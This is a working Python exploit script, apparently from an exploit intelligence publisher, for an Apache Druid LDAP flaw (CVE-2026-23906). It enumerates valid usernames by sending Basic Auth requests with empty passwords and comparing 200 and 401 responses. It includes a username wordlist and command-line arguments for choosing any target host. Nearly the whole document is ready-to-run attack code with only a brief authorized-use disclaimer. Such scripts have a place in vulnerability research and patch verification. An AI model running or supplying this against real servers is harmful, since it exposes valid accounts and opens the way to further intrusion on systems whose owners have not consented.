#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Apache Druid LDAP Username Enumeration via Empty Password
# CVE            : CVE-2026-23906
# Vendor         : Apache Software Foundation
# Product        : Apache Druid
# Affected       : 0.17.0 through 35.x (prior to 36.0.0)
# Type           : CWE-203 - Observable Discrepancy
# CVSS           : 9.8 (Critical)
# Platform       : Multiple
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
LDAP Username Enumeration via Empty Password (Vector 2)

Demonstrates username enumeration via the CVE-2026-23906 auth bypass.
Because the empty password bypass returns 200 for valid LDAP users and 401 for
non-existent users, an attacker can enumerate valid usernames without passwords.

ATTACK CHAIN:
  1. Send Basic Auth with candidate username + empty password
  2. Valid user → 200 OK (exists in LDAP), invalid user → 401 Unauthorized
  3. Repeat across a wordlist to enumerate all valid LDAP accounts

PREREQUISITES:
  - Apache Druid 0.17.0 - 35.x with LDAP authentication enabled
  - LDAP server that permits anonymous binds

REFERENCES:
  - CVE-2026-23906
  - CWE-203: Observable Discrepancy
"""

import sys
import base64
import http.client
import time


RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

DEFAULT_HOST = "localhost"
DEFAULT_PORT = 8888

# Test usernames — mix of known-valid and known-invalid
USERNAMES = [
    # Known valid LDAP users (from bootstrap.ldif)
    "admin",
    "druid_system",
    # Potentially valid (other test users from integration tests)
    "datasourceOnlyUser",
    "stateOnlyUser",
    # Definitely invalid
    "nonexistent_user",
    "attacker",
    "root",
    "test",
    "administrator",
    "",  # empty username — should also fail
]


def check_user_exists(host, port, username, timeout=15):
    """
    Check if a username exists in LDAP by attempting empty-password auth.

    Returns:
        (exists: bool, status_code: int, response_time_ms: float)
    """
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    credentials = base64.b64encode(f"{username}:".encode()).decode()
    headers = {"Authorization": f"Basic {credentials}"}

    start = time.monotonic()
    try:
        conn.request("GET", "/status", headers=headers)
        resp = conn.getresponse()
        resp.read()
        status = resp.status
        elapsed_ms = (time.monotonic() - start) * 1000
        conn.close()
        return (status == 200, status, elapsed_ms)
    except Exception as e:
        elapsed_ms = (time.monotonic() - start) * 1000
        conn.close()
        return (False, 0, elapsed_ms)


def enumerate_users(host, port, usernames):
    """
    Enumerate valid LDAP usernames via the empty-password bypass.
    """
    print(f"""
{BOLD}{RED}╔══════════════════════════════════════════════════════════════════╗
║  CVE-2026-23906 — Vector 2: LDAP Username Enumeration          ║
╚══════════════════════════════════════════════════════════════════╝{RESET}

{CYAN}Attack:{RESET}  Enumerate valid LDAP users via empty-password response oracle
{CYAN}Target:{RESET}  {host}:{port}
{CYAN}Method:{RESET}  Valid user + empty password → 200 | Invalid user → 401
""")

    print(f"{'Username':<25} {'Status':<8} {'Result':<15} {'Time (ms)':<10}")
    print(f"{'-'*25} {'-'*8} {'-'*15} {'-'*10}")

    valid_users = []
    invalid_users = []

    for username in usernames:
        display_name = username if username else "(empty)"
        exists, status, elapsed = check_user_exists(host, port, username)

        if exists:
            valid_users.append(username)
            result = f"{GREEN}USER EXISTS{RESET}"
        else:
            invalid_users.append(username)
            result = f"{RED}NOT FOUND{RESET}"

        print(f"{display_name:<25} {status:<8} {result:<26} {elapsed:>7.1f}ms")

        # Small delay to avoid hammering the server
        time.sleep(0.1)

    # Summary
    print(f"\n{'='*60}")
    print(f"{BOLD}ENUMERATION RESULTS{RESET}")
    print(f"{'='*60}")
    print(f"  Total tested:    {len(usernames)}")
    print(f"  {GREEN}Valid users:     {len(valid_users)}{RESET}")
    for u in valid_users:
        print(f"    {GREEN}✓{RESET} {u}")
    print(f"  {RED}Invalid users:   {len(invalid_users)}{RESET}")
    for u in invalid_users:
        display = u if u else "(empty)"
        print(f"    ✗ {display}")

    if valid_users:
        print(f"\n{GREEN}{BOLD}[+] Username enumeration successful!{RESET}")
        print(f"{GREEN}    Found {len(valid_users)} valid LDAP user(s) without knowing any passwords.{RESET}")
        return True
    else:
        print(f"\n{RED}[-] No valid users found — target may be patched.{RESET}")
        return False


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT

    # Allow custom username list from command line (comma-separated)
    if len(sys.argv) > 3:
        usernames = sys.argv[3].split(",")
    else:
        usernames = USERNAMES

    success = enumerate_users(host, port, usernames)
    sys.exit(0 if success else 1)
